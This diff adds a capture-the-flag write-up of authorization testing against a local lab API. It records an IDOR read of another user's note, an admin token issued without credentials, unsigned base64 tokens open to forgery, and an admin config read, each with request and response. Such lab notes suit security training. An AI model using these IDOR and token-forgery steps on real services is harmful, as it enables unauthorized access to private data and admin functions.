@@ -1,0 +1,20 @@
+Authz testing on 127.0.0.1:18081:
+
+1) IDOR (no credentials at all):
+GET /notes?id=2 -> {"id":"2","note":"admin-secret-FLAG{idor_user2}","viewer":null}
+Ownership check missing: server sets viewer only when a token is supplied (viewer:"1"/"2") but grants the read regardless. /notes?id=1 = alice-note; id=3/4 -> no note.
+
+2) Broken auth on login: /login?user=admin returns a valid admin token without any credential check:
+GET /login?user=admin -> {"token":"eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=","uid":"2"} (base64 of {"uid": "2", "user": "admin"})
+Token is just base64({json uid,user}) — no signature (alg:none-equivalent forgery possible).
+
+3) Forged tokens {"uid":"1","role":"admin"}, {"uid":"admin"}, {"role":"admin"}, {"uid":"1","admin":true}, {"uid":"0"} all -> {"error":"admin only"} on /admin/config across Authorization/X-Token/X-Admin-Token/token headers and ?token= query. So admin check keyed on token uid==2/user==admin.
+
+4) Privileged read with the obtained admin token:
+GET /admin/config with "Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=" -> {"flag": "FLAG{api_chain_ok}", "debug": true}
+GET /admin/config?token=<same> -> same result.
+Raw header value (no "Bearer"), X-Token, X-Admin-Token, Cookie -> admin only. POST -> not found.
+
+5) Info disclosure: /files?name=* leaks absolute server path C:\Users\Administrator\Documents\GitHub\helm-pi\labs\weblab-api\* (no traversal found for tested names).
+
+FLAGS captured: FLAG{idor_user2} (via IDOR /notes?id=2), FLAG{api_chain_ok} (via /admin/config with uid=2 token).
